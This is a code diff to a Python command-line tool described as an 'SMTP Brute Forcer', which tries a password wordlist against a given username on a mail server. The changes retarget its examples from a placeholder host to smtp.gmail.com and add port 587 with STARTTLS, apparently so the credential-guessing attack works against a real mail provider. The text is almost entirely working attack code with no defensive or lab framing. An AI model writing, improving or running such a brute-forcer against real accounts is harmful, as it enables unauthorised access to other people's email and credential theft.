@@ -6,13 +6,14 @@ def brute_force_smtp(target, username, wordlist):
     """
     Function to perform brute force attack on SMTP server with provided username and password wordlist
     Args:
-    - target: SMTP server address (e.g., 'smtp.example.com')
+    - target: SMTP server address (e.g., 'smtp.gmail.com')
     - username: the username to use in the brute-force attempt
     - wordlist: list of potential passwords to try
     """
     try:
-        # Establish connection to the SMTP server
-        server = smtplib.SMTP(target, 25)
+        # Establish connection to the SMTP server (use port 587 for TLS)
+        server = smtplib.SMTP(target, 587)
+        server.starttls()  # Secure the connection with TLS
         server.set_debuglevel(0)
         print(f"Attempting to brute force on {target} with username {username}")
         
@@ -35,7 +36,7 @@ def brute_force_smtp(target, username, wordlist):
 def main():
     # Setup argument parser
     parser = argparse.ArgumentParser(description="SMTP Brute Forcer")
-    parser.add_argument("target", help="SMTP server address (e.g., smtp.example.com)")
+    parser.add_argument("target", help="SMTP server address (e.g., smtp.gmail.com)")
     parser.add_argument("username", help="Username to attempt to brute force")
     parser.add_argument("wordlist", help="File containing password wordlist (one password per line)")
 
